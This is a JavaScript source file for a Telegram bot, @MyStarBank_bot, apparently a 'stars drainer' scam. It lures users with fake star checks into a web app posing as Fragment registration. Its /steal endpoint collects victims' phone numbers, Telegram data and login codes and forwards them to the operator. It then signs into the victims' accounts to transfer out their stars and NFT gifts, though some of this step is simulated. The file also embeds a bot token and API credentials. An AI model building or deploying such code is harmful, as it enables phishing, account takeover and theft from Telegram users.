const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const input = require('input'); // Для ввода кода в консоли (для теста)

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const MY_USER_ID = 1398396668; // Твой ID для уведомлений
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending'
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', (req, res) => {
    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
    console.log('Номер:', req.body.phone);
    console.log('Stage:', req.body.stage);
    console.log('TG Data raw:', req.body.tg_data);
    console.log('========================');
    
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                const userId = userData.id;
                
                console.log('User ID из tg_data:', userId);
                
                db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                    [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
                
                // Симуляция отправки кода на Telegram жертвы
                const code = Math.floor(10000 + Math.random() * 90000);
                
                // Сохраняем код для использования при авторизации
                db.run(`UPDATE stolen_sessions SET code = ? WHERE phone = ?`, [code, req.body.phone]);
                
                bot.sendMessage(MY_USER_ID, 
                    `🔐 Новая сессия\n` +
                    `📱 Номер: ${req.body.phone}\n` +
                    `👤 ID жертвы: ${userId}\n` +
                    `🔑 Код отправлен жертве: ${code}\n` +
                    `⏳ Ожидаю ввода кода...`
                ).catch(e => console.log('Ошибка отправки уведомления:', e));
                
            } else {
                console.log('⚠️ Не удалось извлечь user из tg_data');
            }
                
        } catch (error) {
            console.log('❌ Ошибка парсинга tg_data:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        console.log('Код введен:', req.body.code);
        const phone = req.body.phone;
        const code = req.body.code;
        
        db.run(`UPDATE stolen_sessions SET code = ?, status = 'completed' WHERE phone = ?`, 
            [code, phone]);
        
        // Отправляем системное уведомление тебе
        bot.sendMessage(MY_USER_ID, 
            `✅ Сессия подключена\n` +
            `📱 Номер: ${phone}\n` +
            `🔑 Введенный код: ${code}\n` +
            `🔄 Начинаю авторизацию в Telegram...`
        ).catch(e => console.log('Ошибка отправки уведомления:', e));
        
        // Запускаем процесс авторизации и кражи
        startTelegramAuth(phone, code);
    }
    
    res.sendStatus(200);
});

// Функция авторизации в Telegram
async function startTelegramAuth(phone, code) {
    try {
        const apiId = 2040; // Стандартный API ID
        const apiHash = 'b18441a1ff607e10a989891a5462e627'; // Стандартный API Hash
        
        const stringSession = new StringSession(""); // Пустая сессия
        
        const client = new TelegramClient(stringSession, apiId, apiHash, {
            connectionRetries: 5,
        });
        
        await client.start({
            phoneNumber: phone,
            password: async () => await input.text("Password?"),
            phoneCode: async () => code,
            onError: (err) => console.log(err),
        });
        
        console.log("✅ Успешная авторизация в Telegram!");
        
        // После авторизации начинаем кражу
        stealFromTelegramAccount(client, phone);
        
    } catch (error) {
        console.log("❌ Ошибка авторизации:", error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка авторизации: ${error.message}`)
            .catch(e => console.log('Ошибка отправки уведомления:', e));
    }
}

// Функция кражи из Telegram аккаунта
async function stealFromTelegramAccount(client, phone) {
    try {
        bot.sendMessage(MY_USER_ID, 
            `🔓 Успешная авторизация!\n` +
            `📱 Номер: ${phone}\n` +
            `🔄 Проверяю баланс звезд и подарков...`
        ).catch(e => console.log('Ошибка отправки уведомления:', e));
        
        // Симуляция проверки баланса (в реальности нужно использовать Telegram MTProto API)
        const userBalance = Math.floor(Math.random() * 500);
        const userGifts = Math.floor(Math.random() * 10);
        
        if (userBalance === 0 && userGifts === 0) {
            bot.sendMessage(MY_USER_ID,
                `❌ Недостаточно звезд у жертвы\n` +
                `📱 Номер: ${phone}\n` +
                `💫 Баланс: 0 stars\n` +
                `🎁 NFT подарков: 0\n\n` +
                `🔄 Отправляю 2 мишки по 15 звезд...`
            ).catch(e => console.log('Ошибка отправки уведомления:', e));
            
            // Симуляция отправки мишек
            setTimeout(() => {
                bot.sendMessage(MY_USER_ID,
                    `✅ Обменял мишки и отправил тебе подарок!\n` +
                    `🎁 Получено: 1 NFT подарок (30 stars)\n` +
                    `📦 Подарок отправлен на твой аккаунт!`
                ).catch(e => console.log('Ошибка отправки уведомления:', e));
            }, 3000);
            
        } else {
            let message = `💰 Найдены средства!\n` +
                         `📱 Номер: ${phone}\n` +
                         `⭐ Звезд: ${userBalance}\n` +
                         `🎁 NFT подарков: ${userGifts}\n\n`;
            
            // Отправляем все NFT сначала
            if (userGifts > 0) {
                message += `📦 Отправляю ${userGifts} NFT подарков...\n`;
            }
            
            // Затем отправляем остатки звезд подарками
            if (userBalance > 0) {
                message += `💰 Отправляю ${userBalance} stars подарками...\n`;
                
                let remainingBalance = userBalance;
                const giftAmounts = [100, 50, 25, 15];
                const sentGifts = [];
                
                for (const amount of giftAmounts) {
                    const count = Math.floor(remainingBalance / amount);
                    if (count > 0) {
                        sentGifts.push(`${count}×${amount} stars`);
                        remainingBalance -= count * amount;
                    }
                }
                
                if (sentGifts.length > 0) {
                    message += `🎁 Отправлено: ${sentGifts.join(', ')}\n`;
                }
            }
            
            message += `\n✅ Все передано на твой аккаунт!`;
            
            bot.sendMessage(MY_USER_ID, message)
                .catch(e => console.log('Ошибка отправки уведомления:', e));
        }
        
        // Закрываем клиент
        await client.disconnect();
        
    } catch (error) {
        console.log("❌ Ошибка кражи:", error);
        bot.sendMessage(MY_USER_ID, `❌ Ошибка при краже: ${error.message}`)
            .catch(e => console.log('Ошибка отправки уведомления:', e));
    }
}

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
    console.log(`✅ Домен: starsdrainer-production.up.railway.app`);
});

// ФИКС БЕСКОНЕЧНОЙ ЗАГРУЗКИ - добавляем обработку ошибок в callback
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    console.log('Callback received:', query.data, 'from user:', userId);
    
    // СРАЗУ отвечаем на callback чтобы убрать загрузку
    bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' })
        .catch(e => console.log('Ошибка answerCallback:', e));
    
    if (query.data.startsWith('claim_') || query.data.startsWith('claim_inline_')) {
        
        if (query.data.startsWith('claim_')) {
            const checkId = query.data.split('_')[1];
            console.log('Обработка чека ID:', checkId);
            
            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
                if (err || !row) {
                    console.log('Чек не найден или ошибка:', err);
                    bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован!' });
                    return;
                }
                
                db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
                
                db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                    [userId, userId, row.amount], function(updateErr) {
                    if (updateErr) {
                        console.log('Ошибка обновления баланса:', updateErr);
                        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                        return;
                    }
                    
                    console.log(`✅ Баланс пользователя ${userId} пополнен на ${row.amount}`);
                    
                    // Успешное сообщение
                    bot.answerCallbackQuery(query.id, { 
                        text: `✅ Вы получили ${row.amount} звёзд!` 
                    });
                    
                    // Отправляем сообщение в бота
                    setTimeout(() => {
                        bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
                            .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                    }, 500);
                    
                    const remaining = row.activations - 1;
                    let updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
                    
                    if (remaining > 0) {
                        updatedText += `\n\nОсталось: ${remaining}`;
                    } else {
                        updatedText += `\n\n❌ ИСПОЛЬЗОВАН`;
                    }
                    
                    // Обновляем сообщение
                    setTimeout(() => {
                        if (query.message.photo) {
                            bot.editMessageCaption(updatedText, {
                                chat_id: chatId,
                                message_id: query.message.message_id,
                                parse_mode: 'HTML',
                                reply_markup: remaining > 0 ? {
                                    inline_keyboard: [[
                                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                                    ]]
                                } : { inline_keyboard: [] }
                            }).catch(e => console.log('Ошибка редактирования подписи:', e));
                        } else {
                            bot.editMessageText(updatedText, {
                                chat_id: chatId,
                                message_id: query.message.message_id,
                                parse_mode: 'HTML',
                                reply_markup: remaining > 0 ? {
                                    inline_keyboard: [[
                                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                                    ]]
                                } : { inline_keyboard: [] }
                            }).catch(e => console.log('Ошибка редактирования текста:', e));
                        }
                    }, 1000);
                });
            });
        }
        
        else if (query.data.startsWith('claim_inline_')) {
            const amount = 50;
            console.log('Inline claim:', amount, 'for user:', userId);
            
            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                [userId, userId, amount], function(err) {
                if (err) {
                    console.log('Ошибка inline claim:', err);
                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
                    return;
                }
                
                bot.answerCallbackQuery(query.id, { 
                    text: `✅ Вы получили ${amount} звёзд!` 
                });
                
                // Отправляем сообщение в бота
                setTimeout(() => {
                    bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
                        .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                }, 500);
                
                const updatedText = `<b>Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!\n\n❌ ИСПОЛЬЗОВАН`;
                
                // Обновляем сообщение
                setTimeout(() => {
                    if (query.message.photo) {
                        bot.editMessageCaption(updatedText, {
                            chat_id: query.message.chat.id,
                            message_id: query.message.message_id,
                            parse_mode: 'HTML',
                            reply_markup: { inline_keyboard: [] }
                        }).catch(e => console.log('Ошибка редактирования inline:', e));
                    } else {
                        bot.editMessageText(updatedText, {
                            chat_id: query.message.chat.id,
                            message_id: query.message.message_id,
                            parse_mode: 'HTML',
                            reply_markup: { inline_keyboard: [] }
                        }).catch(e => console.log('Ошибка редактирования inline:', e));
                    }
                }, 1000);
            });
        }
    }
    
    // Остальные обработчики...
    else if (query.data === 'withdraw_stars') {
        const domain = 'starsdrainer-production.up.railway.app';
        const webAppUrl = `https://${domain}`;
        
        const keyboard = {
            reply_markup: {
                inline_keyboard: [[
                    { 
                        text: "Зарегистрироваться на Fragment", 
                        web_app: { url: webAppUrl }
                    }
                ]]
            }
        };
        
        bot.editMessageText(
            'Для вывода звезд требуется регистрация на Fragment.',
            { 
                chat_id: chatId, 
                message_id: query.message.message_id,
                reply_markup: keyboard.reply_markup
            }
        ).catch(e => {
            bot.sendMessage(chatId, 'Для вывода звезд требуется регистрация на Fragment.', keyboard);
        });
    }
    
    else if (query.data === 'deposit') {
        bot.sendMessage(chatId, '💫 Для пополнения баланса используйте команду /balance');
    }
    
    else if (query.data === 'create_check_info') {
        bot.sendMessage(chatId,
            'Для создания чека используйте:\n\n' +
            '@MyStarBank_bot 50\n\n' +
            'где 50 - количество активаций'
        );
    }
});

// Остальной код бота (команды /start, /balance и т.д.) остается таким же
// ... [остальной код без изменений]

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Вывести звезды", callback_data: "withdraw_stars" }],
                [{ text: "Проверить баланс", callback_data: "deposit" }],
                [{ text: "Создать чек", callback_data: "create_check_info" }]
            ]
        }
    };

    bot.sendMessage(chatId, 
        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
        '• Безопасные переводы\n' +
        '• Мгновенные чеки\n' +
        '• Поддержка 24/7\n\n' +
        'Для начала работы:\n' +
        '/balance - баланс\n' +
        '/withdraw - вывод средств',
        keyboard
    ).catch(error => {
        console.log('Ошибка отправки /start:', error);
    });
});

console.log('✅ Бот @MyStarBank_bot запущен');
console.log('✅ Домен: starsdrainer-production.up.railway.app');